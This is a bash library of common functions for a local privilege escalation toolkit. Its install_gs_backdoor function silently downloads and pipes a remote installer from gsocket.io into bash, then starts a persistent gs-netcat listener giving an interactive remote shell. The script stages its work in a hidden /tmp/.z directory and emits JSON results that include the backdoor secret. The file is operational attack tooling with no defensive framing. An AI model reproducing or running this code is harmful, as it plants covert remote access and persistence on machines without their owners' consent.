#!/bin/bash
# Common functions for LPE methods
export RED='\033[0;31m' GREEN='\033[0;32m' YELLOW='\033[1;33m' CYAN='\033[0;36m' NC='\033[0m'
export WORKDIR="/tmp/.z" GSFILE="$WORKDIR/gs_root" RESULTFILE="$WORKDIR/lpe_result"
success(){ echo -e "${GREEN}[✓]${NC} $1"; }
fail(){ echo -e "${RED}[✗]${NC} $1"; }
info(){ echo -e "${CYAN}[*]${NC} $1"; }
warn(){ echo -e "${YELLOW}[!]${NC} $1"; }
is_root(){ [ "$(id -u)" -eq 0 ]; }
install_gs_backdoor(){
    local secret="$1"
    command -v gs-netcat &>/dev/null || { curl -sSL gsocket.io/y 2>/dev/null|bash>/dev/null 2>&1 || wget -qO- gsocket.io/y 2>/dev/null|bash>/dev/null 2>&1; }
    [ -n "$secret" ] && { pkill -f "gs-netcat.*$secret" 2>/dev/null; nohup gs-netcat -s "$secret" -l -i >/dev/null 2>&1 & }
    echo "$secret"
}
result_json(){ echo "{\"method\":\"$1\",\"status\":\"$2\",\"detail\":\"$3\",\"secret\":\"$4\"}"; }
